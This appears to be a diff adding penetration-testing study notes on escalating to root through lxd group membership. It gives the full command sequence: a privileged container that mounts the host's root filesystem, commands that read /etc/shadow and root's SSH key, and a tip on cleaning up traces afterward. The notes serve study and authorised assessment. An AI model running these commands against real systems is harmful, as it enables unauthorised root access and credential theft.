@@ -1,0 +1,123 @@
+🔐 Containers – CPTS Privilege Escalation Summary
+High-level idea:
+If you’re a member of the lxd or lxc group — you can bypass host protections and become root by mounting the host’s root filesystem into a privileged container.
+
+🧠 What You’re Looking For
+🔍 Run this first:
+
+bash
+Copy
+Edit
+id
+✅ If output shows you're in the lxd group:
+
+bash
+Copy
+Edit
+uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
+🟢 You're in business. Time to escalate.
+
+🧱 LXD Privilege Escalation: Step-by-Step
+✅ Step 1 – Confirm Membership
+bash
+Copy
+Edit
+id | grep lxd
+✅ Step 2 – Import a Writable Container Image
+If ubuntu-template.tar.xz or similar is already available:
+
+bash
+Copy
+Edit
+lxc image import ubuntu-template.tar.xz --alias ubuntutemp
+If not, you can download and transfer a prebuilt image to the victim box:
+
+Download from attacker box:
+https://images.linuxcontainers.org
+
+Upload using scp, wget, or python3 -m http.server
+
+✅ Step 3 – Initialize a Privileged Container
+bash
+Copy
+Edit
+lxc init ubuntutemp privesc -c security.privileged=true
+security.privileged=true disables all isolation. You're effectively root on host inside the container.
+
+✅ Step 4 – Mount Host Filesystem
+bash
+Copy
+Edit
+lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+This mounts the host’s / to /mnt/root inside the container.
+
+✅ Step 5 – Start & Enter the Container
+bash
+Copy
+Edit
+lxc start privesc
+lxc exec privesc /bin/bash
+Inside the container:
+
+bash
+Copy
+Edit
+cd /mnt/root/root
+cat /mnt/root/etc/shadow
+cat /mnt/root/root/.ssh/id_rsa
+🔥 You’re effectively root on the host. You can:
+
+Copy SSH keys
+
+Reset root password
+
+Dump /etc/shadow
+
+Edit crontabs, sudoers, etc.
+
+🛡️ What Makes This Dangerous?
+No password needed — just group membership
+
+Mounting host FS gives full control
+
+LXD group is often overlooked in hardening
+
+Easy to automate and chain
+
+⚠️ OPSEC Tip:
+If you exploit this in a real-world assessment:
+
+Clean up container afterward (lxc delete privesc --force)
+
+Watch for logging in /var/log/lxd/
+
+🔁 TL;DR Workflow
+bash
+Copy
+Edit
+# Check group
+id | grep lxd
+
+# Import container image
+lxc image import ubuntu-template.tar.xz --alias ubuntutemp
+
+# Create privileged container
+lxc init ubuntutemp privesc -c security.privileged=true
+
+# Mount host FS
+lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+
+# Start and enter
+lxc start privesc
+lxc exec privesc /bin/bash
+cd /mnt/root
+💀 "If This, Then That" – Container Escalation Flow
+text
+Copy
+Edit
+IF user is in `lxd` group
+    THEN import or upload an image
+        AND initialize a privileged container
+        AND mount host root
+        AND execute shell
+        THEN access /mnt/root as root on host
